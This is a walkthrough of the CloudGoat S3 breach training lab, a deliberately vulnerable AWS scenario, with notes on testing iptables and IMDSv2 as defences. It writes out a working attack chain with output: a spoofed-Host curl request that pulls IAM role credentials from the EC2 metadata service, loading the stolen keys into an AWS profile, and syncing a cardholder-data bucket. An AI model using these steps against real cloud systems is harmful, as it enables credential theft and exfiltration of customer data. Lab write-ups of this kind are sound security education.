


## Walkthrough of the Rhino Labs S3 data breach scenario

<HR>
This walkthrouh includes steps for setup, commands in the cheatsheet which needed slight modification to work.
After going through the scenario as written, I wanted to see:
  
  * What happens if we prevent access to the metadata servie using iptables firewall?
    https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/test1_with_iptables.md

  * How the scenario would be impacted by implementation of the Instance Metadata Service Version 2 (IMDSV2) 
    announced at re:Invent in December, 2019
    https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/test2_with-IMDSv2.md
 

<HR>
  
## Reference: 

Cloud Goat S3 breach scenario (release notes)
https://rhinosecuritylabs.com/aws/capital-one-cloud_breach_s3-cloudgoat/

Scenario Details: 
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/cloud_breach_s3/README.md

Scenario Cheat Sheet:
https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/cloud_breach_s3/cheat_sheet.md

NOTE: Additional setup needed: ‘cloudgoat’ IAM user and profile, described in the CloudGoat 2 release notes 
https://rhinosecuritylabs.com/aws/introducing-cloudgoat-2/

![alt text](https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/images/image0.jpg)



<HR>
  
## Steps in scenario cheat-sheet:

1) curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254' 
``` 
% curl -s http://34.234.223.255/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
cg-banking-WAF-Role-cgidatyedvvzzy
% 
```

2) curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'

```
%~/Cloud_Goat_Test/Walkthrough# curl -s http://34.234.223.255/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidatyedvvzzy -H 'Host:169.254.169.254'
{
  "Code" : "Success",
  "LastUpdated" : "2020-01-12T19:06:22Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "XXXXXXXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "Token" : "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==",
  "Expiration" : "2020-01-13T01:42:16Z"
```

3) aws configure --profile erratic

```
% aws configure --profile erratic
AWS Access Key ID [****************4R4E]: XXXXXXXXXXXXXXXXXX
AWS Secret Access Key [****************plSQ]: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX          
Default region name [us-east-1]: us-east-1
Default output format [None]: 
%
```

4) aws_session_token = <session-token>

Note: the steps required are slightly different than described in the cheat-sheet for this scenario.

Exporting as an environment variable could work, the variable name would need to be capitalized. “export AWS_SESSION_TOKEN=QoJb3Jp...”  The order for processing IAM credentials is: 1) in your code, 2) environment variables, 3) user profile ~/.aws/credentials  4) Role  

The cheat-sheet for the Cloud Goat server side request forgery scenario “ec2_ssrf” shows how to configure the TOKEN in the user profile:  https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/ec2_ssrf/cheat_sheet_solus.md


![alt text](https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/images/image1.jpg)

<HR>
  
After editing for our current test: 

```
% tail ~/.aws/credentials
...
[erratic]
aws_session_token=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==
aws_access_key_id = XXXXXXXXXXXXXXXXXXXXXXXXXXXX
aws_secret_access_key = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxxx
```

<HR>

5) Use new credentials to list S3 buckets?  Success!

```
% aws s3 ls --profile erratic
2020-01-12 14:07:01 cg-cardholder-data-bucket-cgidatyedvvzzy
%
```

<HR>
  
6)  Copy bucket contents

```
% aws s3 sync s3://cg-cardholder-data-bucket-cgidatyedvvzzy ./cardholder-data --profile erratic
download: s3://cg-cardholder-data-bucket-cgidatyedvvzzy/cardholder_data_primary.csv to cardholder-data/cardholder_data_primary.csv
download: s3://cg-cardholder-data-bucket-cgidatyedvvzzy/cardholders_corporate.csv to cardholder-data/cardholders_corporate.csv
download: s3://cg-cardholder-data-bucket-cgidatyedvvzzy/cardholder_data_secondary.csv to cardholder-data/cardholder_data_secondary.csv
download: s3://cg-cardholder-data-bucket-cgidatyedvvzzy/goat.png to cardholder-data/goat.png
```

<HR>
  
7) Reveiw local copy 

```
% ls ./cardholder-data/
cardholder_data_primary.csv  cardholder_data_secondary.csv  cardholders_corporate.csv  goat.png

% ls -ltr
total 456
-rw-r--r-- 1 root root 249500 Jan 12 14:07 goat.png
-rw-r--r-- 1 root root  92165 Jan 12 14:07 cardholders_corporate.csv
-rw-r--r-- 1 root root  59384 Jan 12 14:07 cardholder_data_secondary.csv
-rw-r--r-- 1 root root  58872 Jan 12 14:07 cardholder_data_primary.csv

% firefox ./goat.png
```

![alt text](https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/images/image2.jpg)


<HR> 
  
## Additional Tests: 
  
  
  * What happens if we prevent access to the metadata servie using iptables firewall?
    https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/test1_with_iptables.md

  * How the scenario would be impacted by implementation of the Instance Metadata Service Version 2 (IMDSV2) 
    announced at re:Invent in December, 2019
    https://github.com/JohnLockney/CloudGoat_S3_breach_walkthrough/blob/master/test2_with-IMDSv2.md
 




    


